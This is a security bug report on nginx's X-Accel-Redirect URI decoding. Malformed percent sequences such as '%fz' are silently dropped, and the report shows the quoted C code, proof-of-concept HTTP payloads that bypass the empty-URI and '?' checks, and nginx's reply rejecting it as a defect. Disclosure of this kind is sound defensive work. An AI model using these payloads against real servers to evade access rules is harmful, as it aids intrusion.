## X-Accel-Redirect header : empty character injection in URI 

TL;DR : It is possible to inject malformed URL encoded characters inside a `X-Accel-Redirect` header, which would result in their removal from the URI. The bug can be considered as a security issue, as it can help bypass further nginx or applications rules.

Impacted versions : nginx <= 1.26.0 (latest)

### Details

`X-Accel-Redirect` header provided URI is processed by "ngx_http_upstream_process_headers" (https://github.com/nginx/nginx/blob/branches/stable-1.26/src/http/ngx_http_upstream.c#L2874) :

```c
if (ngx_http_parse_unsafe_uri(r, &uri, &args, &flags) != NGX_OK) {
    ngx_http_finalize_request(r, NGX_HTTP_NOT_FOUND);
    return NGX_DONE;
}
```

The function "ngx_http_parse_unsafe_uri" (https://github.com/nginx/nginx/blob/branches/stable-1.26/src/http/ngx_http_parse.c#L1839) will perform security checks, against dangerous characters like `/../`, as well as detecting URL encoding. 

"ngx_unescape_uri" (https://github.com/nginx/nginx/blob/branches/stable-1.26/src/core/ngx_string.c#L1677) performs the URL decoding, by detecting groups of `%[0-9a-f][0-9a-f]` characters. However, there is a bug in the processing of the last character : 

```c
        case sw_quoted_second:

            state = sw_usual;

            if (ch >= '0' && ch <= '9') {
                // *REDACTED FOR BETTER READABILITY*
                *d++ = ch;
                break;
            }

            c = (u_char) (ch | 0x20);
            if (c >= 'a' && c <= 'f') {
                // *REDACTED FOR BETTER READABILITY*
                *d++ = ch;
                break;
            }

            /* the invalid quoted character */

            break;
```

Here, `%[0-9a-f]` was detected by the two previous iterations (`case sw_usual` and `case sw_quoted`), and so the logic implictly expects the last character to be hexadecimal valid. Nevertheless, if it is not the case, there aren't any branch handling it. This eventually results in a blank round, with the problem of `%[0-9a-f][^0-9a-f]` never being recorded in the final decoded string.

### Demo 

The bug was tested against a local instance of a publicly available application, which was exposing an endpoint allowing users to control the content of `X-Accel-Redirect` header : 

```http
POST /endpoint.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

x_accel_redirect=BEFOR%2545_%fz_%2541FTER
```

Checking the nginx logs (debug mode), we can identify that the malformed `%fz` URL encoded block was removed (instead of staying as is) : 

```
escaped URI: "BEFOR%45_%fz_%41FTER"
unescaped URI: "BEFORE__AFTER"
internal redirect: "BEFORE__AFTER?"
```

#### Additional bypasses

The following check (https://github.com/nginx/nginx/blob/master/src/http/ngx_http_parse.c#L1850), against empty URIs or URIs starting with `?` can also be bypassed :

```c
if (len == 0 || p[0] == '?') {
    goto unsafe;
}
```

Payload `x_accel_redirect=%fz` results in :

```
escaped URI: "%fz"
unescaped URI: ""
internal redirect: "?"
```

Payload `x_accel_redirect=%fz%253f` results in :

```
escaped URI: "%fz%3f"
unescaped URI: "?"
internal redirect: "??"
```

### Potential undesirable uses

This technique can be used to bypass regexes in nginx or applications configurations, or leverage another bugs. However, the testing did not proved that it was possible to bypass the "../" checks with it. No OOB were detected, which would have been theoretically possible due to the incoherent input and output sizes.

`X-Accel-Redirect` header access is not direct, but can be possible through application misconfigurations or by bug chaining.


### Author

Abyss Watcher

### Date of report

13/05/2024

## Security threat qualification

> The NGINX threat model considers backend servers are trusted, so "allowing users to control the content of `X-Accel-Redirect` header" [...], is not recommended. We do not consider the reported behavior to be a security defect in NGINX.

Please ensure you aren't exposing any endpoint, directly or indirectly, that can allow controlling a part or the entirety of an `X-Accel-Redirect` header.